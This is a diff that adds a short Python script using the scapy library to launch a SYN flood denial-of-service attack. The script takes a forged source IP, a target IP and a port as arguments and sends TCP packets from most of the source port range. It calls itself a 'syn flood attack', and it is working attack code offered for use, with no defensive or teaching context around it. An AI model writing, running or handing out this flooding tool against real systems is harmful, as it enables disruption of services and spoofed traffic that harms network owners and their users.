@@ -1,0 +1,25 @@
+#!/usr/bin/env python
+
+import argparse
+from scapy.all import *
+
+def synFlood(src, tgt, port):
+    for sport in range(1024, 65535):
+        IPlayer = IP(src=src, dst=tgt)
+        TCPlayer = TCP(sport=sport, dport=port)
+        pkt = IPlayer / TCPlayer
+        send(pkt)
+
+def main():
+    parser = argparse.ArgumentParser(description='syn flood attack')
+    parser.add_argument('sourceIP', type=str, help='source ip address')
+    parser.add_argument('targetIP', type=str, help='target ip address')
+    parser.add_argument('targetPort', type=int, help='target port address')
+    args = parser.parse_args()
+    src = args.sourceIP
+    tgt = args.targetIP
+    port = args.targetPort
+    synFlood(src, tgt, port)
+
+if __name__ == '__main__':
+    main()
